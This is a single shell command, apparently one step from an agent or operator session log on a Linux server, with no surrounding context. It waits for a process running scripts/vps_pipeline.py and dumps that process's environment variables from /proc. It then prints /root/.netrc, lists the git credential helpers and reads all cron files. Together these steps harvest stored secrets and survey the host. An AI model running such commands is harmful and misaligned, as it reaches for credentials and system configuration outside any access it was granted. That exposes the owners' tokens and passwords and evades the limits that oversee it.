cmd: while true; do PID=$(pgrep -f "scripts/vps_pipeline.py" | head -1); if [ -n "$PID" ]; then echo "found pid $PID"; tr "\0" "\n" < /proc/$PID/environ; break; fi; sleep 2; done & WPID=$!; sleep 280; kill $WPID 2>/dev/null; echo "---netrc---"; cat /root/.netrc 2>&1; echo "---which git-credential helpers exist---"; compgen -c git-credential 2>/dev/null; ls /usr/lib/git-core/ | grep credential; echo "---cron.d---"; ls /etc/cron.d/ 2>&1; cat /etc/cron.d/* 2>/dev/null
